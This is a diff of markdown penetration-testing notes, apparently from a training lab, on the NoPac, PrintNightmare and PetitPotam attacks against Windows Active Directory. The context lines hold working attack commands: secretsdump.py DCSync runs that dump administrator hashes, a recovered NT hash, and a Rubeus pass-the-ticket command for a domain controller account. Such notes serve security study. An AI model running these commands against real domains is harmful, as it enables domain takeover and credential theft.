@@ -1,11 +1,14 @@
 ### Content
 - [NoPac](#nopac)
 - [PrintNightmare](#printnightmare)
+- [PetitPotam](#petitpotam)
 ---
 # NoPac
+
 This vulnerability encompasses two CVEs [2021-42278](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278) and [2021-42287](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287), allowing for intra-domain privilege escalation from any standard domain user to Domain Admin level access in one single command.
 
 ## CVE-2021-42278 – SAM Name impersonation
+
 `A vulnerability with the Security Account Manager (SAM).`
 
 - Internally, Active Directory (AD) uses several naming schemes for a given object. Like userPrincipalName (UPN), and sAMAccountName (SAM-Account).
@@ -13,6 +16,7 @@ This vulnerability encompasses two CVEs [2021-42278](https://msrc.microsoft.com/
 - With default settings, when the relevant patch is **not** applied, a normal user has permission to modify a machine account (up to 10 machines) and as its owner, they also have the permissions to edit its sAMAccountName attribute.
 
 ## CVE-2021-42287 - KDC bamboozling
+
 `A vulnerability within the Kerberos Privilege Attribute Certificate (PAC) in ADDS.`
 
 - When performing an authentication using Kerberos, Ticket-Granting-Ticket (TGT) and the following Ticket-Granting-Service (TGS) are being requested from the Key Distribution Center (KDC). In case a TGS was requested for an account that could not be found, the KDC will attempt to search it again with a trailing `$`.
@@ -40,6 +44,7 @@ $ secretsdump.py -just-dc-user wley -k -no-pass -dc-ip 'ACADEMY-EA-DC01.INLANEFR
 ```
 
 ---
+
 # PrintNightmare
 
 This vulnerability encompasses two CVEs [2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) and [2021-1675](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675) found in the [Print Spooler service](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-prsod/7262f540-dd18-46a3-b645-8ea9b59753dc) that runs on all Windows operating systems and allows remote execution of arbitrary code with SYSTEM rights using a domain account.
@@ -132,16 +137,15 @@ $ PKINITtools/getnthash.py -key <key_from_gettgtpkinit> INLANEFREIGHT.LOCAL/ACAD
 Recovered NT Hash
 00dff1753260356245407a1a4bbb7b58
 
-
-# Using Domain Controller TGT to DCSync the administrator hash
+# Using Domain Controller TGT to DCSync the administrator hash while (KRB5CCNAME exported) 
 $ secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
-
 
 # Using Domain Controller NT hash to DCSync the administrator hash
 $ secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes :00dff1753260356245407a1a4bbb7b58
 ```
 
-After obtaining the base64 blob from `ntlmrelayx.py` we can request a `TGT` and perform `PTT` witch `DC01$` machine account
+After obtaining the base64 blob from `ntlmrelayx.py` we can request a `TGT` and perform `PTT` witch `DC01$` machine account.
+
 ```Powershell
 PS C:\Tools> .\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:MIIStQIBAzC...SNIP...IkHS2vJ51Ry4= /ptt
 
